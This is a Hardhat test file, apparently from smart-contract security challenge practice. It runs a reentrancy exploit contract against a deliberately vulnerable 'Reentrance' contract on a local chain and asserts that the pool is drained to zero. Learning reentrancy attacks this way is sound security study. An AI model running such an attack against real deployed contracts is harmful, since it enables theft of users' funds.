import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers"
import { assert, expect } from "chai"
import { ethers, network, deployments } from "hardhat"
import { Address } from "hardhat-deploy/dist/types"
import { developmentChains, networkConfig } from "../../helper-hardhat-config"
import { Reentrance, ReentrancyExploiter } from "../../typechain-types"

!developmentChains.includes(network.name)
    ? describe.skip
    : describe("King Exploit Testing", () => {
          let reentrance: Reentrance
          let reentranceExploiter: ReentrancyExploiter
          let deployer: SignerWithAddress, exploiter: SignerWithAddress
          // run before test cases
          before(async () => {
              await deployments.fixture(["reentrancy"])
              reentrance = await ethers.getContract("Reentrance")
              reentranceExploiter = await ethers.getContract("ReentrancyExploiter")
              const accounts = await ethers.getSigners()
              deployer = accounts[0]
              exploiter = accounts[1]
          })

          it("reentrancy exploit", async () => {
              const initialBalance = await ethers.provider.getBalance(reentrance.address)
              expect(initialBalance).equals(
                  ethers.utils.parseEther("1"),
                  "initial balance = 1 ether"
              )
              // step 1 - donate 0.00001 ether to contract
              const exploiterBalanceBefore = await ethers.provider.getBalance(
                  reentranceExploiter.address
              )
              const tx = await reentranceExploiter.deposit()
              await tx.wait(1)
              const balanceAfterDeposit = await ethers.provider.getBalance(reentrance.address)
              expect(balanceAfterDeposit).equals(
                  initialBalance.add(exploiterBalanceBefore),
                  "balance increases"
              )

              // step 2 - withdraw with attack
              const exploitTx = await reentranceExploiter.withdraw()
              await tx.wait(1)
              expect(await ethers.provider.getBalance(reentrance.address)).equals(
                  0,
                  "Pool balance == 0 after exploit"
              )
          })
      })
